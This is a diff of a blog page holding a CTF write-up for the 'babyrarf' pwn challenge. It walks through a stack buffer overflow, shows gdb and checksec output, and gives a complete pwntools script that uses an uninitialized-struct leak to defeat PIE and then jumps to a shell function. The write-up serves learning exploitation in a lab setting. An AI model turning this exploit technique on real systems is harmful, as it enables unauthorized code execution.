@@ -3,23 +3,21 @@
   <head>
     <title>[UnionCTF 2021 - pwn] babyrarf // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -38,9 +36,10 @@ This Write-Up is about de first pwn challenge of unionctf: babyrarf. It was a re
 Let&rsquo;s take a look at the src!
 #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;unistd.h&gt; typedef struct attack { uint64_t id; uint64_t dmg; } attack; typedef struct character { char name[10]; int health; } character; uint8_t score; int read_int(){ char buf[10]; fgets(buf, 10, stdin); return atoi(buf); } void get_shell(){ execve(&#34;/bin/sh&#34;, NULL, NULL); } attack choose_attack(){ attack a; int id; puts(&#34;Choose an attack:\n&#34;); puts(&#34;1." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/babyrarf/" />
+<meta property="og:url" content="https://ret2school.github.io/post/babyrarf/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-02-21T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-02-21T00:00:00+00:00" />
+
 
 
   </head>
@@ -108,15 +107,15 @@ Let&rsquo;s take a look at the src!
 <p>This Write-Up is about de first pwn challenge of <a href="https://ctf.cr0wn.uk">unionctf</a>: <a href="">babyrarf</a>.
 It was a really easy challenge with a stack based buffer overflow. The source code was provided so, no need to reverse the binary :).</p>
 <p>Let&rsquo;s take a look at the src!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
 <span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdint.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6"></span>
 <span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> attack {
-    uint64_t id;
-    uint64_t dmg;
+    <span style="color:#8be9fd">uint64_t</span> id;
+    <span style="color:#8be9fd">uint64_t</span> dmg;
 } attack;
 
 <span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> character {
@@ -124,7 +123,7 @@ It was a really easy challenge with a stack based buffer overflow. The source co
     <span style="color:#8be9fd">int</span> health;
 } character;
 
-uint8_t score;
+<span style="color:#8be9fd">uint8_t</span> score;
 
 <span style="color:#8be9fd">int</span> <span style="color:#50fa7b">read_int</span>(){
     <span style="color:#8be9fd">char</span> buf[<span style="color:#bd93f9">10</span>];
@@ -217,7 +216,7 @@ attack <span style="color:#50fa7b">choose_attack</span>(){
 
 </code></pre></div><p>It&rsquo;s basically some kind of game, we have to win a lot of times to display <code>Congratulations! You may now declare yourself the winner</code>. And when we reach this part we can trigger a buffer overflow with a call to fgets (<code>fgets(player.name, 48, stdin);</code>). We notice too the get_shell function (maybe we will have to jump on ?).</p>
 <p>Let&rsquo;s take a look at gdb:</p>
-<pre><code>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+<pre tabindex="0"><code>──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
 0x00007fffffffdf48│+0x0000: 0x00007ffff7dd30b3  →  &lt;__libc_start_main+243&gt; mov edi, eax	 ← $rsp
 0x00007fffffffdf50│+0x0008: 0x00007ffff7ffc620  →  0x0005081200000000
 0x00007fffffffdf58│+0x0010: 0x00007fffffffe038  →  0x00007fffffffe357  →  &quot;/home/nasm/dist/babyrarf&quot;
@@ -243,7 +242,7 @@ attack <span style="color:#50fa7b">choose_attack</span>(){
 ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 gef➤  
 </code></pre><p>And at the call to fgets:</p>
-<pre><code>   0x55555555537d &lt;main+153&gt;       lea    rax, [rbp-0x20]
+<pre tabindex="0"><code>   0x55555555537d &lt;main+153&gt;       lea    rax, [rbp-0x20]
    0x555555555381 &lt;main+157&gt;       mov    esi, 0xa
    0x555555555386 &lt;main+162&gt;       mov    rdi, rax
  → 0x555555555389 &lt;main+165&gt;       call   0x555555555060 &lt;fgets@plt&gt;
@@ -269,7 +268,7 @@ gef➤
 So we have basically a padding of 40 bytes before the return address, and according to the last fgets, we can only enter 48 bytes.
 We can so overwrite only the return address.</p>
 <p>Now we can take a look at the permissions:</p>
-<pre><code>gef➤  checksec
+<pre tabindex="0"><code>gef➤  checksec
 [+] checksec for '/home/nasm/dist/babyrarf'
 Canary                        : ✘ 
 NX                            : ✓ 
@@ -278,7 +277,7 @@ Fortify                       : ✘
 RelRO                         : Partial
 </code></pre><p>We can see, the binary is PIE based, so in order to jump on get_shell we need to leak some binary&rsquo;s functions.
 To do so we can mind the code of <code>choose_attack</code> function:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
 attack <span style="color:#50fa7b">choose_attack</span>(){
     attack a;
     <span style="color:#8be9fd">int</span> id;
@@ -306,7 +305,7 @@ attack <span style="color:#50fa7b">choose_attack</span>(){
 
 </code></pre></div><p>The interesting part is that when our score is zero and that we choose the fourth weapon, the id et dmg fields are not initialized.
 And so it&rsquo;s returning a non initialized struct that it will print just next in the main function:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">
     <span style="color:#6272a4">/* ... */</span>
     a <span style="color:#ff79c6">=</span> choose_attack();
     printf(<span style="color:#f1fa8c">&#34;You choose attack %llu</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, a.id);
@@ -316,7 +315,7 @@ And so it&rsquo;s returning a non initialized struct that it will print just nex
 </code></pre></div><p>Uninitialized structures are very useful to obtain leaks because their content is depending of the ancient stackframes which have stored local variables and especially useful pointers.
 And when we try to leak these datas, we can see that a.id displays the address of <code>__lib_csu_init</code>.
 So we just need to leak the address of <code>__lib_csu_init</code> to compute the base address of the binary and so the address of <code>get_shell</code>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">
 <span style="color:#ff79c6">from</span> pwn <span style="color:#ff79c6">import</span> <span style="color:#ff79c6">*</span>
 
 <span style="color:#6272a4">#p = process(&#34;babyrarf&#34;)</span>
@@ -324,24 +323,24 @@ So we just need to leak the address of <code>__lib_csu_init</code> to compute th
 r <span style="color:#ff79c6">=</span> remote(<span style="color:#f1fa8c">&#39;35.204.144.114&#39;</span>, <span style="color:#bd93f9">1337</span>)
 e <span style="color:#ff79c6">=</span> ELF(<span style="color:#f1fa8c">&#39;babyrarf&#39;</span>)
 
-set_ <span style="color:#ff79c6">=</span> False
+set_ <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
 base <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
 csu_leak <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>
 
 <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">padd</span>(d):
     <span style="color:#ff79c6">return</span> d <span style="color:#ff79c6">+</span> <span style="color:#f1fa8c">&#39;</span><span style="color:#f1fa8c">\00</span><span style="color:#f1fa8c">&#39;</span><span style="color:#ff79c6">*</span>(<span style="color:#bd93f9">8</span><span style="color:#ff79c6">-</span><span style="color:#8be9fd;font-style:italic">len</span>(d))
 
-<span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;What is your name?</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;What is your name?</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
 r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;nasm&#34;</span>)
-<span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;4. A cr0wn</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;4. A cr0wn</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
 r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1&#34;</span>)
 
-<span style="color:#ff79c6">while</span> True:
+<span style="color:#ff79c6">while</span> <span style="color:#ff79c6">True</span>:
     a <span style="color:#ff79c6">=</span> r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;4. A cr0wn</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>, timeout<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>)
 
     <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> a:
         <span style="color:#ff79c6">break</span>
-    <span style="color:#ff79c6">print</span>(a)
+    <span style="color:#8be9fd;font-style:italic">print</span>(a)
     
     <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">not</span> set_:
         r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;4&#34;</span>)
@@ -352,14 +351,14 @@ r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;1
 
     <span style="color:#ff79c6">if</span> <span style="color:#f1fa8c">&#34;l0zers don&#39;t get cr0wns&#34;</span> <span style="color:#ff79c6">in</span> b:
         leak_csu <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(padd(r<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">&#34;&#34;</span>)))
-        <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;leak_csu={}&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">int</span>(leak_csu))))
+        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;leak_csu=</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">int</span>(leak_csu))))
         base <span style="color:#ff79c6">=</span> leak_csu <span style="color:#ff79c6">-</span> e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;__libc_csu_init&#39;</span>]
 
-        <span style="color:#ff79c6">print</span>(<span style="color:#f1fa8c">&#34;base: {}&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(base)))
+        <span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#f1fa8c">&#34;base: </span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#34;</span><span style="color:#ff79c6">.</span>format(<span style="color:#8be9fd;font-style:italic">hex</span>(base)))
 
-        set_ <span style="color:#ff79c6">=</span> True
+        set_ <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
 
-<span style="color:#ff79c6">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;Congratulations! You may now declare yourself the winner:</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
+<span style="color:#8be9fd;font-style:italic">print</span>(r<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">&#34;Congratulations! You may now declare yourself the winner:</span><span style="color:#f1fa8c">\n\n</span><span style="color:#f1fa8c">&#34;</span>))
 
 <span style="color:#6272a4">#gdb.attach(p.pid)</span>
 r<span style="color:#ff79c6">.</span>sendline(<span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">40</span> <span style="color:#ff79c6">+</span> p64(e<span style="color:#ff79c6">.</span>symbols[<span style="color:#f1fa8c">&#39;get_shell&#39;</span>] <span style="color:#ff79c6">+</span> base))
@@ -368,7 +367,7 @@ r<span style="color:#ff79c6">.</span>interactive()
 </code></pre></div><p>We can compute compute the value of rand to avoid bruteforce, but I&rsquo;ve choosen to do not. So while it does not print <code>l0zers don't get cr0wns</code>, I&rsquo;m sending 4 for cr0wn and when it is teh case I get my leak of the csu and I compute the base address.
 When It&rsquo;s done I&rsquo;m sending 1 because it sounds more speed and I wait to win.
 And when I won I can trigger the buffer overflow and jmp on <code>get_shell</code>.</p>
-<pre><code>
+<pre tabindex="0"><code>
 /* ... */
 /* lot of iterations */
 /* ... */
